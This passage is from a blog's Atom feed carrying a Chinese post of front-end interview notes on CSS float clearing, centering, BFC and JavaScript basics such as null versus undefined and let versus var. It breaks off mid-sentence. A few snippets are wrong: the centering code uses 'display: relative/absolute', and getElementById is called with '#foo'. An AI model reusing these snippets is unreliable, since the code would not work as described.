&lt;h4 id=&quot;迁移数据库&quot;&gt;&lt;a href=&quot;#迁移数据库&quot; class=&quot;headerlink&quot; title=&quot;迁移数据库&quot;&gt;&lt;/a&gt;迁移数据库&lt;/h4&gt;&lt;p&gt;SAE 数据库是 MySQL，由于我数据过于庞大，不能通过 phpMyAdmin 导出，所以我使用了 SAE 的 &lt;a href=&quot;http://www.sinacloud.com/doc/sae/php/mysql.html#deferredjob&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DeferredJob&lt;/a&gt; 功能进行数据库导出。
    
    </summary>
    
      <category term="PHP" scheme="http://youngdze.co/categories/PHP/"/>
    
    
      <category term="wordpress" scheme="http://youngdze.co/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>我遇到的前端面试问题</title>
    <link href="http://youngdze.co/2015/10/23/front-end-interview-q-a/"/>
    <id>http://youngdze.co/2015/10/23/front-end-interview-q-a/</id>
    <published>2015-10-22T16:26:41.000Z</published>
    <updated>2017-08-13T11:06:29.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h4><h5 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* 放在浮动元素之后清除浮动 */</span></div><div class="line"><span class="selector-class">.clear</span> &#123;</div><div class="line">    <span class="attribute">clear</span>: both;</div><div class="line">&#125;</div></pre></td></tr></table></figure><a id="more"></a><h5 id="构造-BFC"><a href="#构造-BFC" class="headerlink" title="构造 BFC"></a>构造 BFC</h5><p>有关 BFC 的知识在下面有说，<code>overflow</code> 不为 <code>visible</code> 可构造一个 BFC。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.container</span> &#123;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h5 id="clearfix"><a href="#clearfix" class="headerlink" title="clearfix"></a>clearfix</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.clearfix</span> &#123;</div><div class="line">    &amp;:before,</div><div class="line">    &amp;:after &#123;</div><div class="line">        <span class="attribute">content</span>: <span class="string">""</span>;</div><div class="line">        <span class="attribute">display</span>: table;</div><div class="line">    &#125;</div><div class="line">    &amp;:after &#123;</div><div class="line">        <span class="attribute">clear</span>: both;</div><div class="line">    &#125;</div><div class="line">    zoom: <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="在浮动层内垂直居中"><a href="#在浮动层内垂直居中" class="headerlink" title="在浮动层内垂直居中"></a>在浮动层内垂直居中</h4><p>给浮动层包含个 <code>div</code>，由于 <code>inline-block</code> 直接会产生空隙，消除法看下面：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.container</span> &#123;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">    &amp;&gt;<span class="selector-tag">div</span> &#123;</div><div class="line">        <span class="attribute">display</span>: inline-block;</div><div class="line">        <span class="attribute">vertical-align</span>: middle;</div><div class="line">        <span class="selector-class">.left</span> &#123;</div><div class="line">            <span class="attribute">float</span>: left;</div><div class="line">        &#125;</div><div class="line">        <span class="selector-class">.right</span> &#123;</div><div class="line">            <span class="attribute">float</span>: right;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>改为 <code>table</code> 布局：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.container</span> &#123;</div><div class="line">    <span class="attribute">display</span>: table-row;</div><div class="line">    <span class="selector-class">.left</span>,</div><div class="line">    <span class="selector-class">.right</span> &#123;</div><div class="line">        <span class="attribute">display</span>: table-cell;</div><div class="line">        <span class="attribute">vertical-align</span>: middle;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul><li><a href="http://stackoverflow.com/questions/12557897/how-to-vertically-middle-align-floating-elements-of-unknown-heights" target="_blank" rel="external">http://stackoverflow.com/questions/12557897/how-to-vertically-middle-align-floating-elements-of-unknown-heights</a></li><li><a href="http://stackoverflow.com/questions/16958049/how-to-center-vertically-a-floating-div-inside-an-inline-block" target="_blank" rel="external">http://stackoverflow.com/questions/16958049/how-to-center-vertically-a-floating-div-inside-an-inline-block</a></li></ul><h4 id="元素同行排列"><a href="#元素同行排列" class="headerlink" title="元素同行排列"></a>元素同行排列</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><p>使用 <code>display: inline-block;</code>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.box</span> &#123;</div><div class="line">    <span class="attribute">display</span>: inline-block;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>去掉 <code>inline-block</code> 间的空格方法1：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><p>去掉 <code>inline-block</code> 间的空格方法2：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">0</span>;</div><div class="line">    <span class="selector-class">.box</span> &#123;</div><div class="line">        <span class="attribute">font-size</span>: <span class="number">16px</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>使用 <code>float</code>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    &amp;:before,</div><div class="line">    &amp;:after &#123;</div><div class="line">        <span class="attribute">display</span>: table;</div><div class="line">        <span class="attribute">content</span>: <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line">    &amp;:after &#123;</div><div class="line">        <span class="attribute">clear</span>: both;</div><div class="line">    &#125;</div><div class="line">    <span class="selector-class">.box</span> &#123;</div><div class="line">        <span class="attribute">float</span>: left;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>使用 <code>flexbox</code>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">display</span>: flex;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="为什么不提倡使用-table-布局："><a href="#为什么不提倡使用-table-布局：" class="headerlink" title="为什么不提倡使用 table 布局："></a>为什么不提倡使用 <code>table</code> 布局：</h4><ol><li>占用字节太多，下载慢</li><li>会堵塞页面渲染</li><li>可能得把单个、有逻辑的图片切成分散的小个</li><li>在某些浏览器上导致复制文字很诡异，用户体验差</li><li>一些样式会不起作用 (<code>td { height: 100%; }</code>)</li><li>使用样式时非常难以优化</li><li>作用是展示，不是内容，从语义上看是不正确的</li><li>一旦写好，很难用 <code>CSS</code> 改变它。</li></ol><h4 id="CSS-垂直居中"><a href="#CSS-垂直居中" class="headerlink" title="CSS 垂直居中"></a>CSS 垂直居中</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><p>使用 <code>table</code> 布局：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">display</span>: table-cell;</div><div class="line">    <span class="attribute">vertical-align</span>: middle;</div><div class="line">    <span class="attribute">text-align</span>: center;</div><div class="line">    <span class="selector-class">.inner</span> &#123;</div><div class="line">        <span class="attribute">display</span>: inline-block;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>使用 <code>transform</code>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">display</span>: relative;</div><div class="line">    <span class="selector-class">.inner</span> &#123;</div><div class="line">        <span class="attribute">display</span>: absolute;</div><div class="line">        <span class="attribute">top</span>: <span class="number">50%</span>;</div><div class="line">        <span class="attribute">left</span>: <span class="number">50%</span>;</div><div class="line">        <span class="attribute">transform</span>: translate(-<span class="number">50%</span>, -<span class="number">50%</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>使用 <code>flexbox</code>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">display</span>: flex;</div><div class="line">    <span class="attribute">justify-content</span>: center;</div><div class="line">    <span class="selector-class">.inner</span> &#123;</div><div class="line">        <span class="attribute">align-self</span>: center;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>适用 <code>absolute</code> 布局：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.Absolute-Center</span> &#123;</div><div class="line">    <span class="attribute">margin</span>: auto;</div><div class="line">    <span class="attribute">position</span>: absolute;</div><div class="line">    <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">left</span>: <span class="number">0</span>; <span class="attribute">bottom</span>: <span class="number">0</span>; <span class="attribute">right</span>: <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="浏览器内核"><a href="#浏览器内核" class="headerlink" title="浏览器内核"></a>浏览器内核</h4><ul><li>Blink – Chrome</li><li>Trident – Internet Explorer</li><li>Gecko – Firfox</li><li>Webkit – Safari</li><li>Presto – Opera</li><li>Others</li></ul><h4 id="CSS-盒子模型"><a href="#CSS-盒子模型" class="headerlink" title="CSS 盒子模型"></a>CSS 盒子模型</h4><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/W3C_and_Internet_Explorer_box_models.svg/320px-W3C_and_Internet_Explorer_box_models.svg.png?1445751206628" alt="CSS Box"></p><h4 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h4><p><strong>BFC</strong> 全称 Block Formatting Context，块级格式化上下文，是网页中 <strong>CSS</strong> 渲染的一部分，是一个独立的渲染容器，其内部子元素不会影响到外部元素。</p><h5 id="形成条件"><a href="#形成条件" class="headerlink" title="形成条件"></a>形成条件</h5><ul><li>被根元素所包含</li><li><code>float</code> 不为 <code>none</code></li><li>绝对定位元素，包括 <code>absolute</code> 和 <code>fixed</code></li><li>块状包裹，比如 <code>display</code> 为 <code>inline-block</code>, <code>table-cell</code>, <code>table-caption</code>, <code>flex</code>, <code>inline-flex</code></li><li><code>overflow</code> 不为 <code>visible</code></li></ul><h5 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h5><ul><li>在 <strong>BFC</strong> 内部，各个 Box 一个个垂直放置，由 <strong>BFC</strong> 的头部开始</li><li>相邻之间 Box 的距离由 `margin 决定，同一个 <strong>BFC</strong> 内的相邻 Box 之间会发生 <a href="http://www.w3.org/TR/CSS21/box.html#collapsing-margins" target="_blank" rel="external">margin collapsing</a></li><li>每个 Box 外边界(margin) 都和 <strong>BFC</strong> 左边界相接触(对于从右到左格式化，则接触右边界)，浮动元素同样，除非内部 float Box 又创建一个新的 <strong>BFC</strong></li><li><strong>BFC</strong> 是一个隔离的独立容器，其内部子元素不会影响到外部元素</li><li>计算 <strong>BFC</strong> 的高度时，浮动元素也参与计算</li></ul><h5 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h5><ul><li><a href="http://www.w3.org/TR/CSS21/visuren.html#block-formatting" target="_blank" rel="external">http://www.w3.org/TR/CSS21/visuren.html#block-formatting</a></li><li><a href="http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html" target="_blank" rel="external">http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html</a></li><li><a href="http://www.cnblogs.com/winter-cn/archive/2012/11/16/2772562.html" target="_blank" rel="external">http://www.cnblogs.com/winter-cn/archive/2012/11/16/2772562.html</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_context" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_context</a></li></ul><h4 id="Number-1-和-new-Number-1-的区别"><a href="#Number-1-和-new-Number-1-的区别" class="headerlink" title="Number(1) 和 new Number(1) 的区别"></a>Number(1) 和 new Number(1) 的区别</h4><p><code>1</code> 和 <code>Number(1)</code> 返回的是 number 原始值，<code>new Number(1)</code> 返回一个 Number 对象，<code>Number()</code> 被用于将需要的变量转换为 number 变量。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typeof</span> <span class="number">1</span>;    <span class="comment">// "number"</span></div><div class="line"><span class="keyword">typeof</span> <span class="built_in">Number</span>(<span class="number">1</span>);    <span class="comment">// "number"</span></div><div class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>);    <span class="comment">// "object"</span></div><div class="line"></div><div class="line"><span class="number">1</span> <span class="keyword">instanceof</span> <span class="built_in">Number</span>;    <span class="comment">// false</span></div><div class="line"><span class="built_in">Number</span>(<span class="number">1</span>) <span class="keyword">instanceof</span> <span class="built_in">Number</span>;    <span class="comment">// false</span></div><div class="line"><span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>) <span class="keyword">instanceof</span> <span class="built_in">Number</span>;    <span class="comment">// true</span></div><div class="line"></div><div class="line"><span class="number">1</span> === <span class="built_in">Number</span>(<span class="number">1</span>);    <span class="comment">// true</span></div><div class="line"><span class="number">1</span> === (<span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>)).valueOf();    <span class="comment">// true</span></div></pre></td></tr></table></figure><h4 id="null-和-undefined-的区别"><a href="#null-和-undefined-的区别" class="headerlink" title="null 和 undefined 的区别"></a>null 和 undefined 的区别</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typeof</span> <span class="literal">null</span>    <span class="comment">// "object"</span></div><div class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>    <span class="comment">// undefined</span></div></pre></td></tr></table></figure><p><code>undefined</code> 指定义了但尚未被赋值，<code>null</code> 则是一个可分配的值，比如传给函数的参数为空可以用到 <code>null</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">foo(bar, <span class="literal">null</span>, <span class="literal">null</span>);</div><div class="line"><span class="literal">null</span> === <span class="literal">undefined</span>;    <span class="comment">// false</span></div><div class="line"><span class="literal">null</span> == <span class="literal">undefined</span>;    <span class="comment">// true</span></div><div class="line"><span class="literal">undefined</span> === <span class="literal">undefined</span>;    <span class="comment">// true</span></div><div class="line"><span class="literal">null</span> === <span class="literal">null</span>;    <span class="comment">// true</span></div></pre></td></tr></table></figure><h4 id="克隆-DOM-节点"><a href="#克隆-DOM-节点" class="headerlink" title="克隆 DOM 节点"></a>克隆 DOM 节点</h4><p>仅仅克隆节点不克隆其子元素：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">'#foo'</span>).cloneNode();</div></pre></td></tr></table></figure><p>同时克隆其子元素：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">'#foo'</span>).cloneNode(<span class="literal">true</span>);</div></pre></td></tr></table></figure><h4 id="DOM-的增删"><a href="#DOM-的增删" class="headerlink" title="DOM 的增删"></a>DOM 的增删</h4><p>增加节点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> childNode = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</div><div class="line">childNode.id = <span class="string">'bar'</span>;</div><div class="line">childNode.className = <span class="string">'foo'</span>;</div><div class="line">childNode.href = <span class="string">'http://foo.bar'</span>;</div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">'parentNode'</span>).appendChild(childNode);</div></pre></td></tr></table></figure><p>删除节点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Element.prototype.remove = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.parentElement.removeChild(<span class="keyword">this</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="函数需要的参数长度"><a href="#函数需要的参数长度" class="headerlink" title="函数需要的参数长度"></a>函数需要的参数长度</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span>&#123;&#125;).length === <span class="number">2</span>;    <span class="comment">// true</span></div></pre></td></tr></table></figure><h4 id="怎么判断数组"><a href="#怎么判断数组" class="headerlink" title="怎么判断数组"></a>怎么判断数组</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Object</span>.prototype.toString.call(givenArrVar) === <span class="string">'[object Array]'</span></div></pre></td></tr></table></figure><h4 id="数组-unique"><a href="#数组-unique" class="headerlink" title="数组 unique"></a>数组 unique</h4><p>代码片段来自：<a href="http://stackoverflow.com/a/1961068/3021990" target="_blank" rel="external">Unique values in an array</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Array</span>.prototype.getUnique = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> u = &#123;&#125;, a = [];</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, l = <span class="keyword">this</span>.length; i &lt; l; ++i)&#123;</div><div class="line">        <span class="keyword">if</span>(u.hasOwnProperty(<span class="keyword">this</span>[i])) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        a.push(<span class="keyword">this</span>[i]);</div><div class="line">        u[<span class="keyword">this</span>[i]] = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> a;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="获取-select-的值"><a href="#获取-select-的值" class="headerlink" title="获取 select 的值"></a>获取 select 的值</h4><p>本题来自阿里前端笔试，改变下拉列表框能显示当前选中的值在输入框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"appform"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">size</span>=<span class="string">"1"</span> <span class="attr">name</span>=<span class="string">"selectedApp"</span> <span class="attr">onchange</span>=<span class="string">"changeApp()"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"td"</span> <span class="attr">selected</span>&gt;</span>Taobao<span class="tag">&lt;/<span class="name">option</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"tm"</span>&gt;</span>Tmall<span class="tag">&lt;/<span class="name">option</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"mj"</span>&gt;</span>Miao<span class="tag">&lt;/<span class="name">option</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> changeApp = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> form = <span class="built_in">document</span>.forms.appform;</div><div class="line">    <span class="keyword">var</span> select = form.selectedApp;</div><div class="line">    form.app.value = select[select.selectedIndex].text;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里还有个 <code>selectedOptions</code> 返回一个 element list：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.forms.appform.selectedApp.selectedOptions;</div><div class="line"><span class="comment">// [&lt;option value="td" selected&gt;Taobao&lt;/option&gt;]</span></div></pre></td></tr></table></figure><h4 id="let-和-var-区别"><a href="#let-和-var-区别" class="headerlink" title="let 和 var 区别"></a>let 和 var 区别</h4><p>一个代码块内同名变量用 <code>let</code> 只能声明一次，而 <code>var</code> 可声明多次：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a;</div><div class="line"><span class="keyword">var</span> a;    <span class="comment">// no error</span></div><div class="line"><span class="keyword">let</span> b;</div><div class="line"><span class="keyword">let</span> b;    <span class="comment">// error</span></div></pre></td></tr></table></figure><p><code>let</code> 在 <code>if</code>, <code>for</code> 和 <strong>ECMAScript6</strong> 中的<code>{}</code>内自有作用域，对外部无影响：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line">    <span class="keyword">let</span> b = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(<span class="literal">true</span>) &#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">2</span>;</div><div class="line">    <span class="keyword">let</span> b = <span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">console</span>.log(a);    <span class="comment">// 2</span></div><div class="line">    <span class="built_in">console</span>.log(b);    <span class="comment">// 1</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line">    <span class="keyword">let</span> b = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = <span class="number">2</span>; <span class="literal">false</span>;)&#123;&#125;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> b = <span class="number">2</span>; <span class="literal">false</span>;)&#123;&#125;</div><div class="line"></div><div class="line">    <span class="built_in">console</span>.log(a);    <span class="comment">// 2</span></div><div class="line">    <span class="built_in">console</span>.log(b);    <span class="comment">// 1</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line"><span class="keyword">let</span> b = <span class="number">1</span>;</div><div class="line"></div><div class="line">&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">2</span>;</div><div class="line">    <span class="keyword">let</span> b = <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(a);    <span class="comment">// 2</span></div><div class="line"><span class="built_in">console</span>.log(b);    <span class="comment">// 1</span></div></pre></td></tr></table></figure><p>简而言之，即是 <code>var</code> 